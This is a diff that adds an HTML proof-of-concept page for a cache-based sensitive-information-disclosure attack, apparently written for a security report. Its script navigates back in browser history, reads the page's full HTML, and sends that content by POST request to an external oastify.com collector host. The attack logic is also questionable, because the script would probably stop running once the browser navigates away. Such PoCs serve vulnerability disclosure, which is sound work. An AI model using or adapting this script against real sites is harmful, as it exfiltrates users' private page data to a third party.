@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>POC: Sensitive Information Disclosure</title>
+</head>
+<body>
+    <h1>Proof of Concept for Cache Exploitation</h1>
+    <script>
+        // Simulate pressing the back button to access the cached page
+        history.go(-1);
+
+        // Wait for a second to ensure the page loads, then capture content
+        setTimeout(() => {
+            console.log("Cached Page Content: ", document.body.innerHTML);
+
+            // Optional: Send the captured content to a monitoring endpoint
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://3tx0imjc7dcx2p6lvqiqo4gpmgs7gyim7.oastify.com", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("data=" + encodeURIComponent(document.body.innerHTML));
+        }, 1000);
+    </script>
+</body>
+</html>
